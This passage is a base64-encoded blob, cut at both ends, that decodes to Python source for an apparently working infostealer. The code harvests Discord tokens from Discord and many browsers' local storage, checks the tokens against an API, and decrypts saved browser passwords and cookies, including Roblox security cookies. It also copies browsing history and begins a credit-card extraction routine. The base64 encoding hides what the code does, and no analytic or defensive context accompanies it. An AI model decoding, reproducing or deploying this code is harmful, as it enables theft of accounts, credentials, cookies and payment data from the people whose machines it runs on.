9wZXJhIFNvZnR3YXJlXFxPcGVyYSBTdGFibGVcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdPcGVyYSBHWCc6IHNlbGYucm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBHWCBTdGFibGVcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdBbWlnbyc6IHNlbGYuYXBwZGF0YSArICdcXEFtaWdvXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdUb3JjaCc6IHNlbGYuYXBwZGF0YSArICdcXFRvcmNoXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdLb21ldGEnOiBzZWxmLmFwcGRhdGEgKyAnXFxLb21ldGFcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ09yYml0dW0nOiBzZWxmLmFwcGRhdGEgKyAnXFxPcmJpdHVtXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDZW50QnJvd3Nlcic6IHNlbGYuYXBwZGF0YSArICdcXENlbnRCcm93c2VyXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICc3U3Rhcic6IHNlbGYuYXBwZGF0YSArICdcXDdTdGFyXFw3U3RhclxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnU3B1dG5payc6IHNlbGYuYXBwZGF0YSArICdcXFNwdXRuaWtcXFNwdXRuaWtcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1ZpdmFsZGknOiBzZWxmLmFwcGRhdGEgKyAnXFxWaXZhbGRpXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWUgU3hTJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWUgU3hTXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWUnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2hyb21lMSc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXFByb2ZpbGUgMVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Nocm9tZTInOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxQcm9maWxlIDJcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWUzJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAzXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2hyb21lNCc6IHNlbGYuYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXFByb2ZpbGUgNFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Nocm9tZTUnOiBzZWxmLmFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxQcm9maWxlIDVcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdFcGljIFByaXZhY3kgQnJvd3Nlcic6IHNlbGYuYXBwZGF0YSArICdcXEVwaWMgUHJpdmFjeSBCcm93c2VyXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdNaWNyb3NvZnQgRWRnZSc6IHNlbGYuYXBwZGF0YSArICdcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhXFxEZWZhdWxcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdVcmFuJzogc2VsZi5hcHBkYXRhICsgJ1xcdUNvek1lZGlhXFxVcmFuXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdZYW5kZXgnOiBzZWxmLmFwcGRhdGEgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0JyYXZlJzogc2VsZi5hcHBkYXRhICsgJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnSXJpZGl1bSc6IHNlbGYuYXBwZGF0YSArICdcXElyaWRpdW1cXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJ30KCiAgICAgICAgZm9yIG5hbWUsIHBhdGggaW4gcGF0aHMuaXRlbXMoKToKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgZGlzYyA9IG5hbWUucmVwbGFjZSgiICIsICIiKS5sb3dlcigpCiAgICAgICAgICAgIGlmICJjb3JkIiBpbiBwYXRoOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoc2VsZi5yb2FtaW5nICsgZidcXHtkaXNjfVxcTG9jYWwgU3RhdGUnKToKICAgICAgICAgICAgICAgICAgICBmb3IgZmlsbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBmaWxuYW1lWy0zOl0gbm90IGluIFsibG9nIiwgImxkYiJdOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsbmFtZX0nLCBlcnJvcnM9J2lnbm9yZScpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgeSBpbiByZS5maW5kYWxsKHNlbGYuZW5jcnlwdGVkX3JlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRva2VuID0gc2VsZi5kZWNyeXB0X3ZhbChiYXNlNjQuYjY0ZGVjb2RlKHkuc3BsaXQoJ2RRdzR3OVdnWGNROicpWzFdKSwgc2VsZi5nZXRfbWFzdGVyX2tleShzZWxmLnJvYW1pbmcgKyBmJ1xce2Rpc2N9XFxMb2NhbCBTdGF0ZScpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHNlbGYuYmFzZXVybCwgaGVhZGVycz17CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODAuMC4zOTg3LjE0OSBTYWZhcmkvNTM3LjM2JywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6IHRva2VufSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVpZCA9IHIuanNvbigpWydpZCddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHVpZCBub3QgaW4gc2VsZi5iY19pZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudG9rZW5zLmFwcGVuZCh0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuYmNfaWQuYXBwZW5kKHVpZCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGZvciBmaWxuYW1lIGluIG9zLmxpc3RkaXIocGF0aCk6CiAgICAgICAgICAgICAgICAgICAgaWYgZmlsbmFtZVstMzpdIG5vdCBpbiBbImxvZyIsICJsZGIiXToKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtmaWxuYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwoc2VsZi5yZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldChzZWxmLmJhc2V1cmwsIGhlYWRlcnM9ewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODAuMC4zOTg3LjE0OSBTYWZhcmkvNTM3LjM2JywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0F1dGhvcml6YXRpb24nOiB0b2tlbn0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVpZCA9IHIuanNvbigpWydpZCddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdWlkIG5vdCBpbiBzZWxmLmJjX2lkOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRva2Vucy5hcHBlbmQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuYmNfaWQuYXBwZW5kKHVpZCkKCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoc2VsZi5yb2FtaW5nICsgIlxcTW96aWxsYVxcRmlyZWZveFxcUHJvZmlsZXMiKToKICAgICAgICAgICAgZm9yIHBhdGgsIF8sIGZpbGVzIGluIG9zLndhbGsoc2VsZi5yb2FtaW5nICsgIlxcTW96aWxsYVxcRmlyZWZveFxcUHJvZmlsZXMiKToKICAgICAgICAgICAgICAgIGZvciBfZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgX2ZpbGUuZW5kc3dpdGgoJy5zcWxpdGUnKToKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtfZmlsZX0nLCBlcnJvcnM9J2lnbm9yZScpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHNlbGYucmVnZXgsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoc2VsZi5iYXNldXJsLCBoZWFkZXJzPXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgwLjAuMzk4Ny4xNDkgU2FmYXJpLzUzNy4zNicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdBdXRob3JpemF0aW9uJzogdG9rZW59KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1aWQgPSByLmpzb24oKVsnaWQnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHVpZCBub3QgaW4gc2VsZi5iY19pZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50b2tlbnMuYXBwZW5kKHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmJjX2lkLmFwcGVuZCh1aWQpCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgogICAgZGVmIHJhbmRvbV9kaXJfY3JlYXRlKHNlbGYsIF9kaXI6IHN0ciBvciBvcy5QYXRoTGlrZSA9IGdldHRlbXBkaXIoKSk6CiAgICAgICAgZmlsbmFtZSA9ICcnLmpvaW4ocmFuZG9tLlN5c3RlbVJhbmRvbSgpLmNob2ljZSgnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODknKSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMjApKSkKICAgICAgICBwYXRoID0gb3MucGF0aC5qb2luKF9kaXIsIGZpbG5hbWUpCiAgICAgICAgb3BlbihwYXRoLCAieCIpCiAgICAgICAgcmV0dXJuIHBhdGgKCgogICAgQGV4dHJhY3RfdHJ5CiAgICBkZWYgc3RlYWxfcGFzc3dvcmRzMihzZWxmLCBuYW1lOiBzdHIsIHBhdGg6IHN0ciwgcHJvZmlsZTogc3RyKToKICAgICAgICBwYXRoICs9ICdcXCcgKyBwcm9maWxlICsgJ1xcTG9naW4gRGF0YScKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUocGF0aCk6CiAgICAgICAgICAgIHJldHVybgoKICAgICAgICBsb2dpbnZhdWx0ID0gc2VsZi5yYW5kb21fZGlyX2NyZWF0ZSgpCiAgICAgICAgY29weTIocGF0aCwgbG9naW52YXVsdCkKICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KGxvZ2ludmF1bHQpCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2VsZi5kaXIsICJCcm93c2VycyIsICJBbGwgUGFzc3dvcmRzLnR4dCIpLCAnYScsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIGZvciByZXMgaW4gY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBvcmlnaW5fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnMiKS5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgdXJsLCB1c2VybmFtZSwgcGFzc3dvcmQgPSByZXMKICAgICAgICAgICAgICAgIHBhc3N3b3JkID0gc2VsZi5kY3JwdF92YWwocGFzc3dvcmQsIHNlbGYubWFzdGVya2V5KQogICAgICAgICAgICAgICAgaWYgdXJsICE9ICIiOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiJVUkw6IHt1cmx9XG5JRDoge3VzZXJuYW1lfVxuUEFTU1cwUkQ6IHtwYXNzd29yZH1cblxuIikKICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIG9zLnJlbW92ZShsb2dpbnZhdWx0KQoKICAgIEBleHRyYWN0X3RyeQogICAgZGVmIHN0ZWFsX2Nvb2tpZXMyKHNlbGYsIG5hbWU6IHN0ciwgcGF0aDogc3RyLCBwcm9maWxlOiBzdHIpOgogICAgICAgIHBhdGggKz0gJ1xcJyArIHByb2ZpbGUgKyAnXFxOZXR3b3JrXFxDb29raWVzJwogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoKToKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgY29va2lldmF1bHQgPSBzZWxmLnJhbmRvbV9kaXJfY3JlYXRlKCkKICAgICAgICBjb3B5MihwYXRoLCBjb29raWV2YXVsdCkKICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KGNvb2tpZXZhdWx0KQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNlbGYuZGlyLCAiQnJvd3NlcnMiLCAiQWxsIENvb2tpZXMudHh0IiksICdhJywgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgZm9yIHJlcyBpbiBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBwYXRoLCBlbmNyeXB0ZWRfdmFsdWUsZXhwaXJlc191dGMgRlJPTSBjb29raWVzIikuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgIGhvc3Rfa2V5LCBuYW1lLCBwYXRoLCBlbmNyeXB0ZWRfdmFsdWUsIGV4cGlyZXNfdXRjID0gcmVzCiAgICAgICAgICAgICAgICB2YWx1ZSA9IHNlbGYuZGNycHRfdmFsKGVuY3J5cHRlZF92YWx1ZSwgc2VsZi5tYXN0ZXJrZXkpCiAgICAgICAgICAgICAgICBpZiBob3N0X2tleSBhbmQgbmFtZSBhbmQgdmFsdWUgIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgie31cdHt9XHR7fVx0e31cdHt9XHR7fVx0e31cbiIuZm9ybWF0KAogICAgICAgICAgICAgICAgICAgICAgICBob3N0X2tleSwgJ0ZBTFNFJyBpZiBleHBpcmVzX3V0YyA9PSAwIGVsc2UgJ1RSVUUnLCBwYXRoLCAnRkFMU0UnIGlmIGhvc3Rfa2V5LnN0YXJ0c3dpdGgoJy4nKSBlbHNlICdUUlVFJywgZXhwaXJlc191dGMsIG5hbWUsIHZhbHVlKSkKICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIG9zLnJlbW92ZShjb29raWV2YXVsdCkKCgoKCgoKCgogICAgQGV4dHJhY3RfdHJ5CiAgICBkZWYgc3RlYWxfcGFzc3dvcmRzKHNlbGYpOgogICAgICAgIGYgPSBvcGVuKG50cGF0aC5qb2luKHNlbGYuZGlyLCAnR29vZ2xlJywgJ1Bhc3N3b3Jkcy50eHQnKSwgJ3cnLCBlbmNvZGluZz0iY3A0MzciLCBlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgZm9yIHByb2YgaW4gb3MubGlzdGRpcihzZWxmLmNocm1tdXNlcmR0dCk6CiAgICAgICAgICAgIGlmIHJlLm1hdGNoKHNlbGYuY2hybXJneCwgcHJvZik6CiAgICAgICAgICAgICAgICBsb2dpbl9kYiA9IG50cGF0aC5qb2luKHNlbGYuY2hybW11c2VyZHR0LCBwcm9mLCAnTG9naW4gRGF0YScpCiAgICAgICAgICAgICAgICBsb2dpbiA9IHNlbGYuY3IzNHQzX2YxbGtlcygpCgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKGxvZ2luX2RiLCBsb2dpbikKICAgICAgICAgICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QobG9naW4pCiAgICAgICAgICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucyIpCgogICAgICAgICAgICAgICAgZm9yIHIgaW4gY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICAgICAgdXJsID0gclswXQogICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gclsxXQogICAgICAgICAgICAgICAgICAgIGVuY3J5cHRlZF9wYXNzd29yZCA9IHJbMl0KICAgICAgICAgICAgICAgICAgICBkZWNyeXB0ZWRfcGFzc3dvcmQgPSBzZWxmLmRjcnB0X3ZhbChlbmNyeXB0ZWRfcGFzc3dvcmQsIHNlbGYuY2hyb21lX2tleSkKICAgICAgICAgICAgICAgICAgICBpZiB1cmwgIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiJVUkw6IHt1cmx9XG5JRDoge3VzZXJuYW1lfVxuUEFTU1cwUkQ6IHtkZWNyeXB0ZWRfcGFzc3dvcmR9XG5cbiIpCgogICAgICAgICAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgICAgICAgICAgb3MucmVtb3ZlKGxvZ2luKQogICAgICAgIGYuY2xvc2UoKQoKCgogICAgQGV4dHJhY3RfdHJ5CiAgICBkZWYgc3RlYWxfY29va2llcyhzZWxmKToKICAgICAgICBmID0gb3BlbihudHBhdGguam9pbihzZWxmLmRpciwgJ0dvb2dsZScsICdDb29raWVzLnR4dCcpLCAndycsIGVuY29kaW5nPSJjcDQzNyIsIGVycm9ycz0naWdub3JlJykKICAgICAgICBmb3IgcHJvZiBpbiBvcy5saXN0ZGlyKHNlbGYuY2hybW11c2VyZHR0KToKCiAgICAgICAgICAgIGlmIHJlLm1hdGNoKHNlbGYuY2hybXJneCwgcHJvZik6CgogICAgICAgICAgICAgICAgbG9naW5fZGIgPSBudHBhdGguam9pbihzZWxmLmNocm1tdXNlcmR0dCwgcHJvZiwgJ05ldHdvcmsnLCAnY29va2llcycpCiAgICAgICAgICAgICAgICBsb2dpbiA9IHNlbGYuY3IzNHQzX2YxbGtlcygpCgoKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5Mihsb2dpbl9kYiwgbG9naW4pCiAgICAgICAgICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KGxvZ2luKQogICAgICAgICAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgICAgICAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBob3N0X2tleSwgbmFtZSwgZW5jcnlwdGVkX3ZhbHVlIGZyb20gY29va2llcyIpCgogICAgICAgICAgICAgICAgZm9yIHIgaW4gY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICAgICAgaG9zdCA9IHJbMF0KICAgICAgICAgICAgICAgICAgICB1c2VyID0gclsxXQogICAgICAgICAgICAgICAgICAgIGRlY3J5cHRlZF9jb29raWUgPSBzZWxmLmRjcnB0X3ZhbChyWzJdLCBzZWxmLmNocm9tZV9rZXkpCiAgICAgICAgICAgICAgICAgICAgaWYgaG9zdCAhPSAiIjoKICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZShmIntob3N0fQlUUlVFIisiCQkiKyBmIi9GQUxTRQkyNTk3NTczNDU2CXt1c2VyfQl7ZGVjcnlwdGVkX2Nvb2tpZX1cbiIpCiAgICAgICAgICAgICAgICAgICAgaWYgJ198V0FSTklORzotRE8tTk9ULVNIQVJFLVRISVMuLS1TaGFyaW5nLXRoaXMtd2lsbC1hbGxvdy1zb21lb25lLXRvLWxvZy1pbi1hcy15b3UtYW5kLXRvLXN0ZWFsLXlvdXItUk9CVVgtYW5kLWl0ZW1zLnxfJyBpbiBkZWNyeXB0ZWRfY29va2llOgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnJvYmxveGNvb2tpZXMuYXBwZW5kKGRlY3J5cHRlZF9jb29raWUpCgogICAgICAgICAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgICAgICAgICAgb3MucmVtb3ZlKGxvZ2luKQogICAgICAgIGYuY2xvc2UoKQoKICAgIGRlZiBzdGVhbF9oaXN0b3J5MihzZWxmLCBuYW1lOiBzdHIsIHBhdGg6IHN0ciwgcHJvZmlsZTogc3RyKToKICAgICAgICBwYXRoICs9ICdcXCcgKyBwcm9maWxlICsgJ1xcSGlzdG9yeScKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUocGF0aCk6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIGhpc3Rvcnl2YXVsdCA9IHNlbGYucmFuZG9tX2Rpcl9jcmVhdGUoKQogICAgICAgIGNvcHkyKHBhdGgsIGhpc3Rvcnl2YXVsdCkKICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KGhpc3Rvcnl2YXVsdCkKICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihzZWxmLmRpciwgIkJyb3dzZXJzIiwgIkFsbCBIaXN0b3J5LnR4dCIpLCAnYScsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIHNpdGVzID0gW10KICAgICAgICAgICAgZm9yIHJlcyBpbiBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIHVybCwgdGl0bGUsIHZpc2l0X2NvdW50LCBsYXN0X3Zpc2l0X3RpbWUgRlJPTSB1cmxzIikuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgIHVybCwgdGl0bGUsIHZpc2l0X2NvdW50LCBsYXN0X3Zpc2l0X3RpbWUgPSByZXMKICAgICAgICAgICAgICAgIGlmIHVybCBhbmQgdGl0bGUgYW5kIHZpc2l0X2NvdW50IGFuZCBsYXN0X3Zpc2l0X3RpbWUgIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgc2l0ZXMuYXBwZW5kKCh1cmwsIHRpdGxlLCB2aXNpdF9jb3VudCwgbGFzdF92aXNpdF90aW1lKSkKICAgICAgICAgICAgc2l0ZXMuc29ydChrZXk9bGFtYmRhIHg6IHhbM10sIHJldmVyc2U9VHJ1ZSkKICAgICAgICAgICAgZm9yIHNpdGUgaW4gc2l0ZXM6CiAgICAgICAgICAgICAgICBmLndyaXRlKCJWaXNpdCBDb3VudDogezo8Nn0gVGl0bGU6IHs6PDQwfVxuIi5mb3JtYXQoc2l0ZVsyXSwgc2l0ZVsxXSkpCiAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICBjb25uLmNsb3NlKCkKICAgICAgICBvcy5yZW1vdmUoaGlzdG9yeXZhdWx0KQoKICAgIGRlZiBzdGVhbF9jYzIoc2VsZiwgbmFtZTogc3RyLCBwYXRoOiBzdHIsIHByb2ZpbGU6IHN0cik6CiAgICAgICAgcGF0aCArPSAnXFwnICsgcHJvZmlsZSArICdcXFdlYiBEYXRhJwogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoKToKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgY3JlZGl0X2NhcmRfdmF1bHQgPSBzZWxmLnJhbmRvbV9kaXJfY3JlYXRlKCkKICAgICAgICBjb3B5MihwYXRoLCBjcmVkaXRfY2FyZF92YXVsdCkKICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KGNyZWRpdF9jYXJkX3ZhdWx0KQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNlbGYuZGlyLCAiQnJvd3NlcnMiLCAiQWxsIE